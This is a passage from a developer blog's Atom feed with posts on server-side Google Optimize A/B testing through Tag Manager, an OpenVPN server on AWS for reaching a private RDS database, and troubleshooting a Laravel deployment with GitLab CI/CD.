class="line">    <span class="attr">&quot;og_description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;This is the open graph description&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;image&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://jslim.net/path/to/image.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://jslim.net/path/to/articles/&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;content&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&lt;div&gt;The html content&lt;/div&gt;&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://stackoverflow.com/questions/24768795/get-the-visible-height-of-a-div-with-jquery/26831113#26831113">Get the visible height of a div with jQuery</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Quite often, we have seen a lot of news site &lt;em&gt;(e.g. &lt;a href=&quot;https://www.forbes.com/&quot;&gt;forbes.com&lt;/a&gt;)&lt;/em&gt;,&lt;br&gt;when you scrolled</summary>
        
      
    
    
    
    
    <category term="javascript" scheme="http://jslim.net/tags/javascript/"/>
    
    <category term="jquery" scheme="http://jslim.net/tags/jquery/"/>
    
    <category term="infinite-scroll" scheme="http://jslim.net/tags/infinite-scroll/"/>
    
  </entry>
  
  <entry>
    <title>How to setup Google Optimize server side test with GTM</title>
    <link href="http://jslim.net/blog/2019/06/19/How-to-setup-Google-Optimize-server-side-test-with-GTM/"/>
    <id>http://jslim.net/blog/2019/06/19/How-to-setup-Google-Optimize-server-side-test-with-GTM/</id>
    <published>2019-06-19T12:22:53.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>Recently I come across A/B testing, to see which algorithm is most effective to trigger user clicks.</p><p>Here I use <a href="https://optimize.google.com/">Google Optimize</a>, setup via<br><a href="https://tagmanager.google.com/">Google Tag Manager</a> to do the job.</p><h3 id="1-Setup-Google-Optimize"><a href="#1-Setup-Google-Optimize" class="headerlink" title="1. Setup Google Optimize"></a>1. Setup Google Optimize</h3><p>I assume you have Google Analytics ready. Let’s create an experiment, and select the type <strong>A/B test</strong>.</p><p><img src="/images/posts/2019-06-19-How-to-setup-Google-Optimize-server-side-test-with-GTM/google-optimize.png" alt="Google Optimize setup"></p><p>Create a variant, put in whatever name you like. Then set <strong>Page Targeting</strong> to<br><strong>URL</strong> <em>equals</em> <code>SERVER_SIDE</code>. Link up with GA &amp; set the objective</p><h3 id="2-Setup-in-GTM"><a href="#2-Setup-in-GTM" class="headerlink" title="2. Setup in GTM"></a>2. Setup in GTM</h3><h4 id="1-Create-Data-Layer-variables"><a href="#1-Create-Data-Layer-variables" class="headerlink" title="1. Create Data Layer variables"></a>1. Create Data Layer variables</h4><p><img src="/images/posts/2019-06-19-How-to-setup-Google-Optimize-server-side-test-with-GTM/gtm-data-layer.png" alt="GTM data layer variables"></p><p>Create 2 variables: experiment ID &amp; variant</p><p><img src="/images/posts/2019-06-19-How-to-setup-Google-Optimize-server-side-test-with-GTM/gtm-data-layer-expid.png" alt="GTM data layer variables - experiment ID"></p><p><img src="/images/posts/2019-06-19-How-to-setup-Google-Optimize-server-side-test-with-GTM/gtm-data-layer-expvar.png" alt="GTM data layer variables - variant"></p><h4 id="2-Create-new-tag-for-Google-Analytics-if-you-don’t-have"><a href="#2-Create-new-tag-for-Google-Analytics-if-you-don’t-have" class="headerlink" title="2. Create new tag for Google Analytics (if you don’t have)"></a>2. Create new tag for Google Analytics (if you don’t have)</h4><p><img src="/images/posts/2019-06-19-How-to-setup-Google-Optimize-server-side-test-with-GTM/gtm-ga-fields-to-set.png" alt="GTM tag - google analytics"></p><ul><li>Check the option <strong>Enable overriding settings in this tag</strong></li><li>Add 2 variables to <strong>Fields to Set</strong></li><li>Set the trigger to All Page</li></ul><p><img src="/images/posts/2019-06-19-How-to-setup-Google-Optimize-server-side-test-with-GTM/gtm-pageview-tag.png" alt="GTM tag - google analytics"></p><p>The fields to set is allow you to define which experiment &amp; which variant to run.</p><h3 id="3-Coding"><a href="#3-Coding" class="headerlink" title="3. Coding"></a>3. Coding</h3><p>In server side <em>(I use PHP here)</em>, randomly choose a variant, and select the algorithm to use</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$exp_id</span> = <span class="string">&#x27;xxxxxxxxxx&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// get the cookie value form GA, to make sure the experiment result always consistent</span></span><br><span class="line"><span class="variable">$ga_cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;_ga&#x27;</span>];</span><br><span class="line"><span class="variable">$sess_key</span>  = <span class="string">&#x27;exp-&#x27;</span> . <span class="variable">$ga_cookie</span>;</span><br><span class="line"><span class="variable">$exp_var</span>   = <span class="variable">$_SESSION</span>[<span class="variable">$sess_key</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$exp_var</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="variable">$exp_var</span> = <span class="title function_ invoke__">rand</span>(<span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="variable">$sess_key</span>] = <span class="variable">$exp_var</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$exp_var</span> == <span class="number">1</span>) &#123;</span><br><span class="line">    <span class="comment">// if variant 1, which algorithm to use</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// by default, which algorithm to use</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>In front end, trigger the experiment manually, by setting the <code>dataLayer</code> variable</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">&lt;!-- <span class="title class_">Google</span> <span class="title class_">Tag</span> <span class="title class_">Manager</span> --&gt;</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> dataLayer = [];</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">gtag</span>(<span class="params"></span>) &#123;dataLayer.<span class="title function_">push</span>(<span class="variable language_">arguments</span>)&#125;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">dataLayer.<span class="title function_">push</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&#x27;gaExpId&#x27;</span>: <span class="string">&#x27;&lt;?php echo $expid; ?&gt;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="string">&#x27;gaExpVar&#x27;</span>: <span class="string">&#x27;&lt;?php echo $exp_var; ?&gt;&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">(<span class="keyword">function</span>(<span class="params">w,d,s,l,i</span>)&#123;w[l]=w[l]||[];w[l].<span class="title function_">push</span>(&#123;<span class="string">&#x27;gtm.start&#x27;</span>:</span></span><br><span class="line"><span class="language-javascript"><span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>(),<span class="attr">event</span>:<span class="string">&#x27;gtm.js&#x27;</span>&#125;);<span class="keyword">var</span> f=d.<span class="title function_">getElementsByTagName</span>(s)[<span class="number">0</span>],</span></span><br><span class="line"><span class="language-javascript">j=d.<span class="title function_">createElement</span>(s),dl=l!=<span class="string">&#x27;dataLayer&#x27;</span>?<span class="string">&#x27;&amp;l=&#x27;</span>+<span class="attr">l</span>:<span class="string">&#x27;&#x27;</span>;j.<span class="property">async</span>=<span class="literal">true</span>;j.<span class="property">src</span>=</span></span><br><span class="line"><span class="language-javascript"><span class="string">&#x27;https://www.googletagmanager.com/gtm.js?id=&#x27;</span>+i+dl;f.<span class="property">parentNode</span>.<span class="title function_">insertBefore</span>(j,f);</span></span><br><span class="line"><span class="language-javascript">&#125;)(<span class="variable language_">window</span>,<span class="variable language_">document</span>,<span class="string">&#x27;script&#x27;</span>,<span class="string">&#x27;dataLayer&#x27;</span>,<span class="string">&#x27;GTM-1234567&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>Note that the <code>dataLayer.push</code> must before the GTM script.</p><p>If you have any questions, <a href="https://support.google.com/optimize/community">please ask here</a>.</p><hr><p><strong>P/S: If you’re looking for other way of do A/B testing, this article might be for you</strong><br><a href="https://www.toptal.com/aws/ab-testing-with-aws-lambda-at-edge">Flexible A/B Testing with AWS Lambda@Edge</a></p><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://developers.google.com/optimize/devguides/experiments">Optimize - Server-side Experiments</a></li><li><a href="https://support.google.com/optimize/answer/9059383?hl=en">Optimize JavaScript API</a></li><li><a href="https://stackoverflow.com/questions/48386350/google-tag-manager-optimize-server-side-experiment-sending-variation/52157837#52157837">Google Tag Manager &amp; Optimize Server-Side experiment sending variation</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;Recently I come across A/B testing, to see which algorithm is most effective to trigger user clicks.&lt;/p&gt;
&lt;p&gt;Here I use &lt;a</summary>
        
      
    
    
    
    
    <category term="google-analytics" scheme="http://jslim.net/tags/google-analytics/"/>
    
    <category term="google-optimize" scheme="http://jslim.net/tags/google-optimize/"/>
    
    <category term="ab-test" scheme="http://jslim.net/tags/ab-test/"/>
    
  </entry>
  
  <entry>
    <title>Setup OpenVPN in AWS for RDS access</title>
    <link href="http://jslim.net/blog/2019/06/07/Setup-OpenVPN-in-AWS/"/>
    <id>http://jslim.net/blog/2019/06/07/Setup-OpenVPN-in-AWS/</id>
    <published>2019-06-07T05:17:41.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>When we use AWS, often we will use RDS, for security reason, is better to not to expose to public.</p><p><img src="/images/posts/2019-06-07-Setup-OpenVPN-in-AWS/rds-settings.png" alt="RDS settings"></p><p>What if we want to access via MySQL client? Here’s why we need VPN.</p><h2 id="1-Create-an-EC2-instance"><a href="#1-Create-an-EC2-instance" class="headerlink" title="1. Create an EC2 instance"></a>1. Create an EC2 instance</h2><p>After you created an EC2 instance <em>(I chose Ubuntu 18.04)</em>, then create an elastic IP and associate with this instance.</p><p>Because we don’t want risk the IP to change when the instance restarted.</p><p><img src="/images/posts/2019-06-07-Setup-OpenVPN-in-AWS/aws-ec2-elastic-ip.png" alt="AWS Elastic IP"></p><h2 id="2-Follow-this-post"><a href="#2-Follow-this-post" class="headerlink" title="2. Follow this post."></a>2. <a href="https://www.cyberciti.biz/faq/howto-setup-openvpn-server-on-ubuntu-linux-14-04-or-16-04-lts/">Follow this post</a>.</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ip<span class="number">-172</span>-xxx-xxx-xxx:~$ sudo bash openvpn-install.sh</span><br><span class="line"></span><br><span class="line">Welcome <span class="built_in">to</span> this OpenVPN <span class="string">&quot;road warrior&quot;</span> installer!</span><br><span class="line"></span><br><span class="line">I need <span class="built_in">to</span> ask you <span class="keyword">a</span> few questions <span class="keyword">before</span> starting <span class="keyword">the</span> setup.</span><br><span class="line">You can leave <span class="keyword">the</span> default options <span class="keyword">and</span> just press enter <span class="keyword">if</span> you are ok <span class="keyword">with</span> them.</span><br><span class="line"></span><br><span class="line">First, provide <span class="keyword">the</span> IPv4 address <span class="keyword">of</span> <span class="keyword">the</span> network interface you want OpenVPN</span><br><span class="line">listening <span class="built_in">to</span>.</span><br><span class="line">IP address: <span class="number">172.</span>xxx.xxx.xxx</span><br><span class="line"></span><br><span class="line">This server is behind NAT. What is <span class="keyword">the</span> public IPv4 address <span class="keyword">or</span> hostname?</span><br><span class="line">Public IP address / hostname: <span class="number">54.</span>yyy.yyy.yyy</span><br><span class="line"></span><br><span class="line">Which protocol <span class="built_in">do</span> you want <span class="keyword">for</span> OpenVPN connections?</span><br><span class="line">   <span class="number">1</span>) UDP (recommended)</span><br><span class="line">   <span class="number">2</span>) TCP</span><br><span class="line">Protocol [<span class="number">1</span><span class="number">-2</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">What port <span class="built_in">do</span> you want OpenVPN listening <span class="built_in">to</span>?</span><br><span class="line">Port: <span class="number">1194</span></span><br><span class="line"></span><br><span class="line">Which DNS <span class="built_in">do</span> you want <span class="built_in">to</span> use <span class="keyword">with</span> <span class="keyword">the</span> VPN?</span><br><span class="line">   <span class="number">1</span>) Current <span class="keyword">system</span> resolvers</span><br><span class="line">   <span class="number">2</span>) <span class="number">1.1</span><span class="number">.1</span><span class="number">.1</span></span><br><span class="line">   <span class="number">3</span>) Google</span><br><span class="line">   <span class="number">4</span>) OpenDNS</span><br><span class="line">   <span class="number">5</span>) Verisign</span><br><span class="line">DNS [<span class="number">1</span><span class="number">-5</span>]: <span class="number">1</span></span><br><span class="line"></span><br><span class="line">Finally, tell me your name <span class="keyword">for</span> <span class="keyword">the</span> client certificate.</span><br><span class="line">Please, use <span class="literal">one</span> <span class="built_in">word</span> only, no special <span class="keyword">characters</span>.</span><br><span class="line">Client name: js</span><br><span class="line"></span><br><span class="line">Okay, that was all I needed. We are ready <span class="built_in">to</span> <span class="built_in">set</span> up your OpenVPN server now.</span><br><span class="line">Press <span class="keyword">any</span> key <span class="built_in">to</span> continue...</span><br></pre></td></tr></table></figure><p>The first time, enter the private IP <em>(should be auto populated)</em>, then 2nd time is the elastic IP.</p><p>Now, you still won’t be able to connect to VPN yet.</p><h2 id="3-Create-a-security-group"><a href="#3-Create-a-security-group" class="headerlink" title="3. Create a security group"></a>3. Create a security group</h2><p>Because the new instance doesn’t open some ports by default, now let create.<br>In the inbound tab:</p><table><thead><tr><th>Type</th><th>Protocol</th><th>Port Range</th><th>Source</th><th>Description</th></tr></thead><tbody><tr><td>Custom UDP Rule</td><td>UDP</td><td>1194</td><td>0.0.0.0/0</td><td></td></tr><tr><td>SSH</td><td>TCP</td><td>22</td><td>0.0.0.0/0</td><td></td></tr><tr><td>Custom TCP Rule</td><td>TCP</td><td>943</td><td>0.0.0.0/0</td><td></td></tr><tr><td>HTTPS</td><td>TCP</td><td>443</td><td>0.0.0.0/0</td><td></td></tr></tbody></table><p>Then go back to instance menu, select the OpenVPN instance, and associate the VPN security group.</p><p><img src="/images/posts/2019-06-07-Setup-OpenVPN-in-AWS/ec2-change-security-group.png" alt="EC2 change security group"></p><h2 id="4-Update-RDS-security-group"><a href="#4-Update-RDS-security-group" class="headerlink" title="4. Update RDS security group"></a>4. Update RDS security group</h2><p>In the inbound tab</p><table><thead><tr><th>Type</th><th>Protocol</th><th>Port Range</th><th>Source</th><th>Description</th></tr></thead><tbody><tr><td>MYSQL/Aurora</td><td>TCP</td><td>3306</td><td>172.xxx.xxx.0/24</td><td>Web App</td></tr><tr><td>MYSQL/Aurora</td><td>TCP</td><td>3306</td><td>172.xxx.xxx.xxx/32</td><td>OpenVPN</td></tr></tbody></table><p>After this, you should be able to connect your local to VPN, and connect MySQL client to RDS.</p><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://www.freecodecamp.org/news/how-you-can-use-openvpn-to-safely-access-private-aws-resources-f904cd24f890/">How you can use OpenVPN to safely access private AWS resources</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;When we use AWS, often we will use RDS, for security reason, is better to not to expose to public.&lt;/p&gt;
&lt;p&gt;&lt;img</summary>
        
      
    
    
    
    
    <category term="server" scheme="http://jslim.net/tags/server/"/>
    
    <category term="aws" scheme="http://jslim.net/tags/aws/"/>
    
    <category term="rds" scheme="http://jslim.net/tags/rds/"/>
    
    <category term="openvpn" scheme="http://jslim.net/tags/openvpn/"/>
    
  </entry>
  
  <entry>
    <title>Laravel auto deployment with GitLab CI/CD</title>
    <link href="http://jslim.net/blog/2019/06/02/Laravel-auto-deployment-with-GitLab-CI-CD/"/>
    <id>http://jslim.net/blog/2019/06/02/Laravel-auto-deployment-with-GitLab-CI-CD/</id>
    <published>2019-06-02T13:06:32.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I’ve been heard of continuous integration long ago, thus I decide to give it a try.<br>I found <a href="https://docs.gitlab.com/ee/ci/examples/laravel_with_gitlab_and_envoy/">the official guideline from GitLab</a> itself, and it looks quite complicated.<br>End up I follow <a href="https://lorisleiva.com/laravel-deployment-using-gitlab-pipelines/">this article</a>.</p><h2 id="Challenge"><a href="#Challenge" class="headerlink" title="Challenge"></a>Challenge</h2><p>I’m not going to repeat the original article, here what I wanted to share is the problems that I faced, and it took me days to try and error to make it works.</p><h3 id="1-Composer-install-error"><a href="#1-Composer-install-error" class="headerlink" title="1. Composer install error"></a>1. Composer install error</h3><p>I’ve Nova installed, and it required a json file for authentication purpose.</p><p>So what I’ve changed <em>(the <a href="https://github.com/lorisleiva/laravel-docker/blob/master/gitlab/.gitlab-ci.deployments.yml">original .gitlab-ci.yml</a> is from the original author)</em></p><p><strong>.gitlab-ci.yml</strong></p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">composer:</span></span><br><span class="line">  <span class="attr">stage:</span> <span class="string">build</span></span><br><span class="line">  <span class="attr">cache:</span></span><br><span class="line">    <span class="attr">key:</span> <span class="string">$&#123;CI_COMMIT_REF_SLUG&#125;-composer</span></span><br><span class="line">    <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">vendor/</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">cp</span> <span class="string">auth.json.example</span> <span class="string">auth.json</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">sed</span> <span class="string">-i&#x27;.bck&#x27;</span> <span class="string">&quot;s/my-username/$NOVA_USER/g&quot;</span> <span class="string">auth.json</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">sed</span> <span class="string">-i&#x27;.bck&#x27;</span> <span class="string">&quot;s/my-secret-password/$NOVA_PASS/g&quot;</span> <span class="string">auth.json</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">rm</span> <span class="string">auth.json.bck</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">composer</span> <span class="string">install</span> <span class="string">--prefer-dist</span> <span class="string">--no-ansi</span> <span class="string">--no-interaction</span> <span class="string">--no-progress</span> <span class="string">--no-scripts</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">cp</span> <span class="string">.env.example</span> <span class="string">.env</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">php</span> <span class="string">artisan</span> <span class="string">key:generate</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure><p>What I’ve done is just add a few commands to replace the Nova username &amp; password to the <strong>auth.json</strong> file, the <strong>auth.json.example</strong> look like below.</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;http-basic&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;nova.laravel.com&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my-username&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;password&quot;</span><span class="punctuation">:</span> <span class="string">&quot;my-secret-password&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>Then where’s the <code>$NOVA_USER</code> &amp; <code>$NOVA_PASS</code>? Just go to your GitLab project</p><p>Settings -&gt; CI/CD -&gt; Variables</p><p><img src="/images/posts/2019-06-02-Laravel-auto-deployment-with-GitLab-CI-CD/gitlab-cicd-variable.png" alt="GitLab environment variables"></p><p>Then, in <strong>config/deploy.php</strong>, add the auth.json to the shared folder, edit the <code>options</code> section (<a href="https://github.com/lorisleiva/laravel-deployer/issues/116">GitHub issue</a>)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">    <span class="string">&#x27;options&#x27;</span> =&gt; [</span><br><span class="line">        <span class="comment">// ...</span></span><br><span class="line">        <span class="string">&#x27;shared_files&#x27;</span> =&gt; [</span><br><span class="line">            <span class="string">&#x27;.env&#x27;</span>,</span><br><span class="line">            <span class="string">&#x27;auth.json&#x27;</span>,</span><br><span class="line">        ],</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">];</span><br></pre></td></tr></table></figure><p>By default, the only <strong>.env</strong> will be symlinked to shared folder, so now make sure you copy the <strong>auth.json</strong> file to shared folder in your remote server.</p><h3 id="2-Create-a-new-user-for-deployment"><a href="#2-Create-a-new-user-for-deployment" class="headerlink" title="2. Create a new user for deployment"></a>2. Create a new user for deployment</h3><p>For this part, I was referring to <a href="https://docs.gitlab.com/ee/ci/examples/laravel_with_gitlab_and_envoy/">the GitLab article</a>.</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># <span class="keyword">Create</span> <span class="keyword">user</span> deployer</span><br><span class="line">$ sudo adduser deployer</span><br><span class="line"># Give the <span class="keyword">read</span>-<span class="keyword">write</span>-<span class="keyword">execute</span> permissions <span class="keyword">to</span> deployer <span class="keyword">user</span> <span class="keyword">for</span> directory /var/www</span><br><span class="line">$ sudo setfacl -R -m u:deployer:rwx /var/www</span><br><span class="line"># <span class="keyword">Then</span> <span class="keyword">add</span> <span class="keyword">to</span> www-data <span class="keyword">group</span></span><br><span class="line">$ sudo usermod -aG www-data deployer</span><br><span class="line"># <span class="keyword">also</span> allow this <span class="keyword">user</span> <span class="keyword">to</span> run <span class="keyword">as</span> sudo</span><br><span class="line">$ sudo usermod -aG sudo deployer</span><br></pre></td></tr></table></figure><p>I didn’t allow the whole <strong>/var/www</strong> to <strong>deployer</strong> user, so I created a project folder</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">mkdir</span> /var/www/mysite</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chown</span> -R deployer:www-data /var/www/mysite</span></span><br></pre></td></tr></table></figure><p>Now, must make sure the rsa private key store in <strong>/home/deployer/.ssh/</strong></p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">-rw-------<span class="number"> 1 </span>deployer deployer<span class="number"> 2669 </span>Jun <span class="number"> 2 </span>11:26 authorized_keys</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>deployer deployer <span class="number"> 301 </span>Jun <span class="number"> 1 </span>05:11 config</span><br><span class="line">-rw-------<span class="number"> 1 </span>deployer deployer<span class="number"> 3389 </span>Jun <span class="number"> 1 </span>05:10 id_rsa_gitlab</span><br><span class="line">-rw-r--r--<span class="number"> 1 </span>deployer deployer<span class="number"> 1337 </span>Jun <span class="number"> 2 </span>08:56 known_hosts</span><br></pre></td></tr></table></figure><p><em>refer to the original article for more info</em></p><h3 id="3-post-autoload-dump-event-returned-with-error-code-1"><a href="#3-post-autoload-dump-event-returned-with-error-code-1" class="headerlink" title="3. post-autoload-dump event returned with error code 1"></a>3. post-autoload-dump event returned with error code 1</h3><p>Another problem I’ve faced</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; post-autoload-<span class="keyword">dump</span>: @php artisan <span class="keyword">package</span>:discover</span><br><span class="line">Script @php artisan <span class="keyword">package</span>:discover handling the post-autoload-<span class="keyword">dump</span> event</span><br><span class="line">returned with error code <span class="number">1</span></span><br></pre></td></tr></table></figure><p>I’m using <a href="https://github.com/barryvdh/laravel-debugbar">barryvdh/laravel-debugbar</a>, previously was in <code>require-dev</code>, I solve the issue by just moving from <code>require-dev</code> to <code>require</code>.</p><h3 id="4-The-command-“which-npm”-failed"><a href="#4-The-command-“which-npm”-failed" class="headerlink" title="4. The command “which npm” failed."></a>4. The command “which npm” failed.</h3><p>I was struggling with this for hours, end up, it’s due to the interactive &amp; non-interactive shell mode, <a href="https://capistranorb.com/documentation/faq/why-does-something-work-in-my-ssh-session-but-not-in-capistrano/">see here for more info</a>.</p><p>Then I realised, I was installing the <code>npm</code> with <a href="https://github.com/nvm-sh/nvm">nvm</a>, this is install as per user.</p><p>I solved this issue by removing the <code>npm</code> &amp; <code>node</code> from nvm</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">rm</span> -rf ~/.nvm</span></span><br></pre></td></tr></table></figure><p>and install node globally. <a href="https://www.digitalocean.com/community/tutorials/how-to-install-node-js-on-ubuntu-18-04">Refer to this article: Installing Using a PPA</a></p><p><a href="https://github.com/lorisleiva/laravel-deployer/issues/117">GitHub issue</a></p><h3 id="5-No-application-encryption-key-has-been-specified"><a href="#5-No-application-encryption-key-has-been-specified" class="headerlink" title="5. No application encryption key has been specified"></a>5. No application encryption key has been specified</h3><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">production.<span class="keyword">ERROR</span>: <span class="keyword">No</span> application encryption key has been specified. &#123;<span class="string">&quot;exception&quot;</span>:&quot;[object] (RuntimeException(code: 0): <span class="keyword">No</span> application encryption key has been specified. at /<span class="keyword">var</span>/www/mysite/releases/2/vendor/laravel/framework/src/Illuminate/Encryption/EncryptionServiceProvider.php:44)</span><br></pre></td></tr></table></figure><p>This is very obvious, the <code>APP_KEY</code> is empty. So I run</p><figure class="highlight verilog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ php artisan key:<span class="keyword">generate</span></span><br><span class="line">$ php artisan <span class="keyword">config</span>:cache</span><br></pre></td></tr></table></figure><p>And I refresh the browser, still getting the same error. I even tried in <a href="https://github.com/laravel/tinker">tinker</a>, and able to get result by</p><figure class="highlight python-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;&gt;&gt;</span> <span class="language-python">echo 